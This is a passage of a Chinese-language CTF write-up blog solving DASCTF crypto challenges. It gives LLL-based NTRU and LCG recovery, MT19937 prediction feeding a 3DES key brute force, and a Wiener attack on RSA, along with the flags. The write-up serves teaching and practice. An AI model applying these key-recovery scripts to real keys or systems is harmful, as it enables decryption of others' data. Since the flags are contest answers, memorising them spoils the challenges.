get_key()</span><br><span class="line">c = encrypt2(s[<span class="number">3</span>], p, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;h =&quot;</span>, h)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line"><span class="comment"># S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line"><span class="comment"># S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line"><span class="comment"># S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line"><span class="comment"># p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line"><span class="comment"># h = 2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line"><span class="comment"># c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p><code>encrypt1()</code> 和 <code>encrypt2()</code> 分别是LCG和NTRU。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">h = <span class="number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span></span><br><span class="line">p = <span class="number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span></span><br><span class="line">c = <span class="number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span></span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f,g = -f,-g</span><br><span class="line"><span class="built_in">print</span>(f, g)</span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"></span><br><span class="line">S1 = <span class="number">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span></span><br><span class="line">S2 = <span class="number">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span></span><br><span class="line">S4 = <span class="number">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span></span><br><span class="line">S5 = <span class="number">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span></span><br><span class="line">s = [S1,S2,m,S4,S5]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">n, a, b = crack_unknown_modulus(s)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">seed = (S1-b)*inverse_mod(a,n)%n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(seed)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;NTRU_L0G_a6e_S1mpLe&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SigninCrypto"><a href="#SigninCrypto" class="headerlink" title="SigninCrypto"></a>SigninCrypto</h3><blockquote><p>随机数真随机吗？如随！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key</span><br><span class="line"><span class="keyword">from</span> iv <span class="keyword">import</span> iv</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">K1= key</span><br><span class="line">hint1 = os.urandom(<span class="number">2</span>) * <span class="number">8</span></span><br><span class="line">xor =bytes_to_long(hint1)^bytes_to_long(K1)</span><br><span class="line"><span class="built_in">print</span>(xor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Rand</span>():</span><br><span class="line">    rseed = secrets.randbits(<span class="number">1024</span>)</span><br><span class="line">    List1 = []</span><br><span class="line">    List2 = []</span><br><span class="line">    seed(rseed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        rand16 = getrandbits(<span class="number">16</span>)</span><br><span class="line">        List1.append(rand16)</span><br><span class="line">    seed(rseed)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        rand64 = getrandbits(<span class="number">64</span>)</span><br><span class="line">        List2.append(rand64)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;task.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> rand16 <span class="keyword">in</span> List1:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(rand16)+ <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> rand64 <span class="keyword">in</span> List2:</span><br><span class="line">            file.write(<span class="built_in">hex</span>((rand64 &amp; <span class="number">0xffff</span>) | ((rand64 &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">Rand()</span><br><span class="line"></span><br><span class="line">K2 = long_to_bytes(getrandbits(<span class="number">64</span>))</span><br><span class="line">K3 = flag[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">KEY = K1 + K2 + K3</span><br><span class="line"></span><br><span class="line">IV=iv</span><br><span class="line"></span><br><span class="line">IV1=IV[:<span class="built_in">len</span>(IV)//<span class="number">2</span>]</span><br><span class="line">IV2=IV[<span class="built_in">len</span>(IV)//<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">digest1 = hashlib.sha512(IV1).digest().<span class="built_in">hex</span>()</span><br><span class="line">digest2 = hashlib.sha512(IV2).digest().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">digest=digest1+digest2</span><br><span class="line">hint2=(bytes_to_long(IV)&lt;&lt;<span class="number">32</span>)^bytes_to_long(os.urandom(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bytes_to_long((digest.encode()))))</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mode = DES3.MODE_CBC</span><br><span class="line">des3 = DES3.new(KEY, mode, IV)</span><br><span class="line"></span><br><span class="line">pad_len = <span class="number">8</span> - <span class="built_in">len</span>(flag) % <span class="number">8</span></span><br><span class="line">padding = <span class="built_in">bytes</span>([pad_len]) * pad_len</span><br><span class="line">flag += padding</span><br><span class="line"></span><br><span class="line">cipher = des3.encrypt(flag)</span><br><span class="line"></span><br><span class="line">ciphertext=cipher.<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 334648638865560142973669981316964458403</span></span><br><span class="line"><span class="comment"># 0x62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833</span></span><br><span class="line"><span class="comment"># 22078953819177294945130027344</span></span><br><span class="line"><span class="comment"># a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1</span></span><br></pre></td></tr></table></figure></blockquote><p>3DES加密，key由三部分组成，$K_1$ 根据不同位数异或得到random的两个字节值，$K_2$ 利用MT19937算法计算输出值，$K_3$ 为flag前八位，即 <code>&#39;DASCTF&#123;&#39;+?</code>，共需爆破1个可见字符；8字节iv，由sha512结果知前后4字节相同，由hint2知，iv右移4字节后错位异或，hint2高4位即为4字节iv值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s1 = [...]</span><br><span class="line">s2 = [...]</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">    x = (s1[<span class="number">2</span>*i+<span class="number">1</span>]&lt;&lt;<span class="number">48</span>) | ((s2[i]&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">32</span>) | (s1[<span class="number">2</span>*i]&lt;&lt;<span class="number">16</span>) | (s2[i]&amp;<span class="number">0xffff</span>)</span><br><span class="line">    predictor.setrandbits(x, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">K2 = long_to_bytes(predictor.getrandbits(<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(K2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">d = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;62343937373634656339396239663236643437363738396663393438316230353665353733303939613830616662663633326463626431643139323130616333363363326631363235313661656632636265396134336361623833636165373964343533666537663934646239396462323666316236396232303539336438336234393737363465633939623966323664343736373839666339343831623035366535373330393961383061666266363332646362643164313932313061633336336332663136323531366165663263626539613433636162383363616537396434353366653766393464623939646232366631623639623230353933643833&#x27;</span>)</span><br><span class="line">d1 = d[:<span class="number">128</span>]</span><br><span class="line">d2 = d[<span class="number">128</span>:]</span><br><span class="line"><span class="built_in">print</span>(d1)</span><br><span class="line"><span class="built_in">print</span>(d2)</span><br><span class="line"><span class="built_in">print</span>(d1==d2)</span><br><span class="line"></span><br><span class="line">xor = <span class="number">334648638865560142973669981316964458403</span></span><br><span class="line">hint2 = <span class="number">22078953819177294945130027344</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a6546bd93bced0a8533a5039545a54d1fee647007df106612ba643ffae850e201e711f6e193f15d2124ab23b250bd6e1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">hint1 = bytes_to_long(long_to_bytes(xor&gt;&gt;<span class="number">112</span>)*<span class="number">8</span>)</span><br><span class="line">K1 = long_to_bytes(hint1 ^ xor)</span><br><span class="line"><span class="built_in">print</span>(K1)</span><br><span class="line"></span><br><span class="line">iv = hint2&gt;&gt;(<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">IV = long_to_bytes(iv)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(IV)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k3 <span class="keyword">in</span> trange(<span class="number">128</span>):</span><br><span class="line">    K3 = <span class="string">b&#x27;DASCTF&#123;&#x27;</span>+<span class="built_in">bytes</span>([k3])</span><br><span class="line">    KEY = K1 + K2 + K3</span><br><span class="line">    des3 = DES3.new(KEY, DES3.MODE_CBC, IV)</span><br><span class="line">    m = des3.decrypt(c)</span><br><span class="line">    <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;DASCTF&#123;&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8e5ee461-f4e1-4af2-8632-c9d62f4dc073&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="esyRSA"><a href="#esyRSA" class="headerlink" title="esyRSA"></a>esyRSA</h3><blockquote><p>好像这个RSA有点怪啊！私钥给你了！我的e呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> p, q</span><br><span class="line"></span><br><span class="line">e = ?????</span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">ans = gcd(e,phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> n, e, d</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="built_in">str</span>(p + q)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 8064259277274639864655809758868795854117113170423331934498023294296505063511386001711751916634810056911517464467899780578338013011453082479880809823762824723657495915284790349150975180933698827382368698861967973964030509129133021116919437755292590841218316278732797712538885232908975173746394816520256585937380642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span></span><br><span class="line"><span class="string">d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ 直接给得有问题，重复了一遍，巨坑。</p><p>正确的 $n=$80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</p><p>$n$ 与 $d$ 位数相近，$e$ 很小，Wiener Attack /爆破/求 $e$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">d = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="comment"># Converts a rational x/y fraction into a list of partial quotients [a0, ..., an]</span></span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="comment"># computes the list of convergents using the list of partial quotients</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)): convs.append(contfrac_to_rational(frac[<span class="number">0</span> : i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span> (frac):</span><br><span class="line">    <span class="comment"># Converts a finite continued fraction [a0, ..., an] to an x/y rational.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>): num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>: <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = egcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if x*x - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">e = crack_rsa(d, n)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 13521</span></span><br></pre></td></tr></table></figure><p>再已知 $n,e,d$ 求 $p,q$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">divide_pq</span>(<span class="params">e, d, n</span>):</span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> 